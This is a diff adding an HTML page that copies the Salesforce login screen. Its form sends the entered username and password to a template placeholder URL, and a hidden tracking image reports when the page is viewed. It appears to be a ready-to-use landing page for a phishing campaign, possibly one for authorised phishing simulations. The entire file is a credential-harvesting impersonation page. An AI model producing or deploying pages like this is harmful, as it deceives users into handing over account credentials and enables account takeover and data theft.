@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Login | Salesforce</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Salesforce Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f4f6f9; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { background: #fff; padding: 16px 32px; border-bottom: 1px solid #dddbda; display: flex; align-items: center; }
+        .header-logo { font-size: 24px; font-weight: 700; color: #032d60; }
+        .header-logo span { color: #0176d3; }
+        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+        .login-card { width: 480px; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); overflow: hidden; }
+        .card-header { background: #0176d3; padding: 24px 32px; }
+        .card-header h1 { font-size: 22px; font-weight: 700; color: #fff; }
+        .card-header p { font-size: 14px; color: rgba(255,255,255,0.8); margin-top: 4px; }
+        .card-body { padding: 32px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 700; color: #3e3e3c; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 10px 14px; border: 1px solid #dddbda; border-radius: 4px; font-size: 14px; outline: none; transition: all 0.2s; }
+        .form-group input:focus { border-color: #0176d3; box-shadow: 0 0 0 1px #0176d3; }
+        .checkbox-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .checkbox-row label { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #3e3e3c; cursor: pointer; }
+        .checkbox-row a { font-size: 13px; color: #0176d3; text-decoration: none; }
+        .checkbox-row a:hover { text-decoration: underline; }
+        .submit-btn { width: 100%; background: #0176d3; color: #fff; border: none; padding: 12px; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background 0.2s; }
+        .submit-btn:hover { background: #014486; }
+        .card-footer { padding: 0 32px 24px; text-align: center; }
+        .card-footer a { font-size: 13px; color: #0176d3; text-decoration: none; display: block; margin-bottom: 8px; }
+        .card-footer a:hover { text-decoration: underline; }
+        .custom-domain { margin-top: 16px; padding-top: 16px; border-top: 1px solid #dddbda; }
+        .custom-domain label { font-size: 13px; color: #706e6b; display: block; margin-bottom: 6px; }
+        .domain-input { display: flex; gap: 8px; }
+        .domain-input input { flex: 1; padding: 8px 12px; border: 1px solid #dddbda; border-radius: 4px; font-size: 13px; outline: none; }
+        .domain-input button { background: #fff; border: 1px solid #dddbda; border-radius: 4px; padding: 8px 16px; font-size: 13px; color: #0176d3; cursor: pointer; font-weight: 600; }
+        .domain-input button:hover { background: #f4f6f9; }
+        .footer { text-align: center; padding: 20px; font-size: 12px; color: #706e6b; }
+        @media (max-width: 480px) { .login-card { width: 100%; border-radius: 0; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">sales<span>force</span></div>
+    </div>
+    <div class="main">
+        <div class="login-card">
+            <div class="card-header">
+                <h1>Log In to Salesforce</h1>
+                <p>Access your Salesforce account</p>
+            </div>
+            <div class="card-body">
+                <form action="{{.URL}}" method="POST">
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" placeholder="Username" required autofocus>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                    </div>
+                    <div class="checkbox-row">
+                        <label><input type="checkbox" name="remember"> Remember me</label>
+                        <a href="#">Forgot Your Password?</a>
+                    </div>
+                    <button type="submit" class="submit-btn">Log In</button>
+                </form>
+            </div>
+            <div class="card-footer">
+                <a href="#">Use Custom Domain</a>
+                <div class="custom-domain" style="display:none">
+                    <label>Custom Domain</label>
+                    <div class="domain-input">
+                        <input type="text" placeholder="my-domain">
+                        <button>Continue</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">&copy; Salesforce.com</div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
